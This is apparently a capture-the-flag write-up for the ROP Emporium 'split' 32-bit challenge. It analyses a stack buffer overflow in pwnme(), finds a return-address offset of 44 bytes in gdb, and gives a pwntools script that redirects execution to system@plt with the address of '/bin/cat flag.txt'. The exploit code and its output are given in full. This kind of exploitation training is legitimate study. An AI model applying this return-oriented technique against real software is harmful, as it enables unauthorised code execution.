

# analyze

```shell
➜  x86 checksec ./split32 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/split/x86/split32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

IDA
```c
int pwnme()
{
  char s[40]; // [esp+0h] [ebp-28h] BYREF

  memset(s, 0, 0x20u);
  puts("Contriving a reason to ask user for data...");
  printf("> ");
  read(0, s, 0x60u);                            // overflow vuln
  return puts("Thank you!");
}

// also:
int usefulFunction()        
{
  return system("/bin/ls");     // wrong our target arg
}
```

```shell
# check system call address
➜  x86 objdump -D split32| grep  "system"
080483e0 <system@plt>:
 804861a:       e8 c1 fd ff ff          call   80483e0 <system@plt>
```

IDA search strings
```shell
.data:0804A030                 public usefulString
.data:0804A030 usefulString    db '/bin/cat flag.txt',0
```

hijack the ret address to system `0x080483e0`，control the arg pass to the system function->  `usefulString addr: 0x0804A030` 

# exploit
**calculate the offset to ret address** 
```shell
➜  x86 gdb ./split32
GNU gdb (GDB) 8.3
Copyright (C) 2019 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./split32...
(No debugging symbols found in ./split32)
gdb-peda$ pattern create 80
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A'
gdb-peda$ r
Starting program: /home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/split/x86/split32 
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A
Thank you!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xf7fb6870 --> 0x0 
ESI: 0xf7fb5000 --> 0x1b2db0 
EDI: 0xf7fb5000 --> 0x1b2db0 
EBP: 0x41304141 ('AA0A')
ESP: 0xffffd080 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A\n")
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xffffd080 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A\n")
0004| 0xffffd084 ("AAGAAcAA2AAHAAdAA3AAIAAeAA4A\n")
0008| 0xffffd088 ("AcAA2AAHAAdAA3AAIAAeAA4A\n")
0012| 0xffffd08c ("2AAHAAdAA3AAIAAeAA4A\n")
0016| 0xffffd090 ("AAdAA3AAIAAeAA4A\n")
0020| 0xffffd094 ("A3AAIAAeAA4A\n")
0024| 0xffffd098 ("IAAeAA4A\n")
0028| 0xffffd09c ("AA4A\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ pattern offset 0x41414641
1094796865 found at offset: 44          # offset = 44
```

**payload**



![stack layout](assets/README/image.png)


# exp
```python
from pwn import *

pipe = process("./split32")

print(pipe.recvuntil("> "))

syscall = 0x080483e0
flag_string = 0x0804A030

payload = "A" * 44
payload += p32(syscall)
payload += p32(0xdeadbeef)
payload += p32(flag_string)

pipe.sendline(payload)
print(pipe.recvall())
```

```shell
➜  x86 python ./exp.py 
[+] Starting local process './split32': pid 55533
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> 
[+] Receiving all data: Done (44B)
[*] Stopped process './split32' (pid 55533)
Thank you!
ROPE{a_placeholder_32byte_flag!}
```
